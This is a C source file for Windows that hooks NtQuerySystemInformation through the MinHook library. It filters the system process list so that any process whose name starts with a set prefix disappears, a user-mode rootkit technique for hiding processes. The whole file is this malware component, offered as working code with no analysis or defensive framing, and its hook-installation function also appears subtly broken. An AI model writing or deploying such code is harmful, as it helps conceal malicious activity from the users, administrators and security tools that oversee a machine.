#include <Windows.h>
#include <stdio.h>
#include "structs.h"
#include "common.h"
#include "Hooks.h"
#include "vanWin.h"
#include "TypeDef.h"
#include "MinHook.h"



fnNtQuerySystemInformation originalNtQuery;
fnNtQuerySystemInformation newNtQuery;

BOOL InitialiseHooks() {

    MH_Initialize();
    InstallHook(L"NTDLL", "NtQuerySystemInformation", (LPVOID*) & originalNtQuery, hookedNtQuery, &newNtQuery);
    MH_EnableHook(MH_ALL_HOOKS);

    return TRUE;
}

NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS stat = newNtQuery(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);


    if (SystemInformationClass == SystemProcessInformation && stat == 0) {

        PSYSTEM_PROCESS_INFORMATION prev = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)prev + prev->NextEntryOffset);

        while (TRUE) {

            if (HasPrefixU(curr->ImageName)) {
                prev->NextEntryOffset += curr->NextEntryOffset;
                curr = prev;
            }

            if (!curr->NextEntryOffset)
                break;

            prev = curr;
            curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
        }
    }
    return stat;
}


BOOL InstallHook(LPCWSTR dll, LPCSTR function, LPVOID *originalFunction, LPVOID hookedFunction, LPVOID* newFunction) {

    *originalFunction = (LPVOID)GetProcAddress(GetModuleHandle(dll), function);

    if (MH_CreateHook(&originalFunction, &hookedFunction, &newFunction) != MH_OK) {
        return FALSE;
    }

    if (MH_EnableHook(originalFunction) != MH_OK) {
        return FALSE;
    }

    return TRUE;
}

BOOL UnHook() {

    if (MH_DisableHook(originalNtQuery) != MH_OK) {
        return FALSE;
    }

    if (MH_Uninitialize() != MH_OK) {
        return FALSE;
    }

    return TRUE;
}


BOOL HasPrefix(LPCWSTR str)
{
    return str && !StrCmpNIW(str, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}
BOOL HasPrefixU(UNICODE_STRING str)
{
    return str.Buffer && str.Length / sizeof(WCHAR) >= HIDE_PREFIX_LENGTH && !StrCmpNIW(str.Buffer, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}